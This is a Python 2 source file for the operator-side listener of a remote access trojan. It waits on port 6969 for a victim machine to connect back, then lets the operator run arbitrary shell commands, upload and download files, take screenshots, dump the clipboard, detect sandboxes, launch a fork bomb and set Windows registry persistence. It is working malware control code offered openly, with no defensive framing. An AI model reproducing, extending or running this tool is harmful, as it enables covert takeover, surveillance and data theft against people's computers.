#!/usr/bin/python
import base64,json,socket,sys

ip='127.0.0.1'
print (ip)
port = 6969
global count

red="\033[1;32;31m"
green="\033[1;32;32m"
yellow="\033[1;32;33m"
blue="\033[1;32;34m"
cyan="\033[1;32;36m"
black="\033[1;32;30m"
r="\x1b[0m"

help = """
\n
********************************************************************************
* h -> print this help message                                                 *
* cd ->  change directory                                                      *
* pwd -> print current working directory                                       *
* download [file name] -> download a file (not directory)                      *
* upload [file name]  -> upload a file (not directory)                         *
* sysinfo  -> print system and OS information                                  *
* shot -> take a screenshot                                                    *
* rm -> remove a file                                                          *
* rmdir -> remove a directory                                                  *
* mkdir -> create a new directory                                              *
* chk  -> check if the system is a sandbox or VM                               *
* clip -> dump clipboard                                                       *
* fork -> run a fork bomb in victim machine                                    *
* persistance -> set persistance using REGKEY (windows only)                   *
********************************************************************************
* ALL OTHER COMMANDS WILL BE EXECUTED AS SYSTEM SHELL COMMANDS                 *
********************************************************************************
 \n"""

class listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(3)
        print cyan,"[*] waiting for connection...",r
        self.conn, addr = listener.accept()
        print green,"target ", str(addr), "is on...",r

    def json_send(self,data):
        try:
            json_data=json.dumps(data)
            return self.conn.send(json_data)
        except:
            pass

    def write_file(self,path,content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[+] download completed [+]"
        except:
            return "[-] download failed [-]"

    def read_file(self,path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except :
            return red,"[-] no such file or directory [-]",r

    def receive(self):
        json_data = ""

        while True:
            try:
                json_data = json_data + self.conn.recv(4096)
                return json.loads(json_data)
            except ValueError:
                continue

    def execution(self, cmd):
        if cmd[0]=="exit":
            self.conn.close()
            exit()
        self.json_send(cmd)
        return self.receive()

    def run(self):

        count = 1

        while True:
            cmd = raw_input(">> ")
            cmd=cmd.split(" ")
            try:
                if cmd[0] == "h":
                    print cyan,help,r
                elif cmd[0]=="upload" :
                    print blue,"[*] uploading ", str(cmd[1:]) , "...",r
                    file_content=self.read_file(cmd[1])
                    cmd.append(file_content)
                result = self.execution(cmd)
                if result == None:
                    pass
                elif cmd[0]=="download":
                    print blue,"[*] Downloading " , str(cmd[1:]) , "...",r
                    result=self.write_file(cmd[1],result)
                    print(result)
                elif cmd[0] == "key-start":
                    continue
                elif cmd[0] == "shot":
                    print blue,"[*] taking screenshot [*]",r
                    name = "screenshot%s.png" % str(count)
                    result=self.write_file(name,result)
                    print green,"[+] screenshot captured [+]",r
                    count +=1
                else:
                    print(result)
            except Exception:
                result = Exception
try:
    starter = listener(ip, port)
    starter.run()
except KeyboardInterrupt:
    print "exiting..."
    sys.exit()
